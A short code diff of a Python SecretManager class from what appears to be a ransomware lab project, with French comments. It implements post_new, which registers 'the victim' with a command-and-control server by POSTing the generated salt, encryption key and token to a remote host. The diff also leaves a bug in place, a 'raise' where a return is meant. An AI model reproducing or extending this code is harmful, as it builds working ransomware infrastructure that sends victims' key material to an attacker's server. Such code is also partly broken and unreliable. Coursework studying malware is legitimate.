@@ -42,7 +42,7 @@ class SecretManager:
         salt = secrets.token_bytes(self.SALT_LENGTH) # génération d'un sel aléatoire
         key = secrets.token_bytes(self.KEY_LENGTH) # génération d'une clé aléatoire
         token = self.do_derivation(salt, key) # génération du jeton à partir du sel et de la clé
-        raise (salt, key, token) # retourne le sel, la clé et du jeton
+        raise (salt, key, token) # retourne le sel, la clé et le jeton
         
 
     def bin_to_b64(self, data:bytes)->str:
@@ -51,7 +51,16 @@ class SecretManager:
 
     def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
         # register the victim to the CNC
-        raise NotImplemented()
+        url = f"http://{self._remote_host_port}/new"
+        data = { "token" : self.bin_to_b64(token),
+        "salt" : self.bin_to_b64(salt),
+        "key" : self.bin_to_b64(key)}
+        response = requests.post(url, json=data)
+        if response.status_code != 200:
+            self._log.info("Echec de l'envoi des nouveaux elements cryptographiques")
+        else:
+            self._log.info("Envoi des nouveaux elements cryptographiques reussi")
+        
 
     def setup(self)->None:
         # main function to create crypto data and register malware to cnc
